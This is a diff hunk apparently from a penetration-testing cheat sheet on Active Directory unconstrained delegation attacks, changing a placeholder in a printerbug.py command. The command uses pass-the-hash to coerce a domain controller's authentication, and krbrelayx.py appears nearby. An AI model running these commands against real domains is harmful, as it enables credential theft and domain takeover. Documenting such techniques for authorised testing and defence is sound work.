@@ -28,7 +28,7 @@ krbrelayx.py -aesKey <aes256-cts-hmac-sha1-96-VALUE>
 ```
 ## Unconstrained Delegations - step 5
 ```
-printerbug.py <DOMAIN>/'<vuln_account>$'@'<DC_IP>' -hashes <HASH> '<DomainController>'
+printerbug.py <DOMAIN>/'<vuln_account>$'@'<DC-IP>' -hashes <HASH> '<DomainController>'
 ```
 ## Unconstrained Delegations - step 6
 ```
